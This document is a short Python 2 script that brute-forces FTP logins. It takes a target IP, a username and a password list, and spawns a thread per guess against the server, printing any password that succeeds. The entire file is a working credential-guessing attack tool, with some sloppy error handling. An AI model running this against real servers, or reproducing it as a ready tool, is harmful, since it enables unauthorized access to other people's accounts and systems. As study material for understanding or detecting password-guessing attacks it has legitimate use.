import ftplib
import optparse
from threading import *
import time

def anonlogin(hostname,user,password):
	
	try:
		ftp=ftplib.FTP(hostname)
		ftp.login(user,password)
		print "[*]FTP login Successfull[*]:"+password
		ftp.quit()
		exit(0)
	except Exception,e:
		if "Too many open files" in e:
			time.sleep(5)
			anonlogin(hostname,user,password)			
			print "FTP Login Failed with ERROR: "+str(e)
			return False

def main():
	parser=optparse.OptionParser('Program usage --IP <FTP Server Ip> -U <Username> -F <Password File>')
	parser.add_option('--IP',dest='tgtip',type='string',help='Specify ip of FTP Server')
	parser.add_option('-U',dest='user',type='string',help='Specify username')
	parser.add_option('-F',dest='pfile',type='string',help='Specify password File')
	(options,args)=parser.parse_args()
	FSip=options.tgtip
	user=options.user
	pfile=options.pfile
	
	if (FSip==None or user==None or pfile==None):
		print parser.usage
		exit(0)
	
	pwdfile=open(pfile,'r')
	line=pwdfile.readline()
	while line:
		password=line.strip()  #read the file line by line and store it in variable password
		print "[-] Testing: "+str(password)
		t=Thread(target=anonlogin,args=(FSip,user,password))
		t.start()
		#anonlogin(FSip,user,password)
		line=pwdfile.readline()	

'''def main():
	optparse()'''

if __name__=='__main__':
	main()		
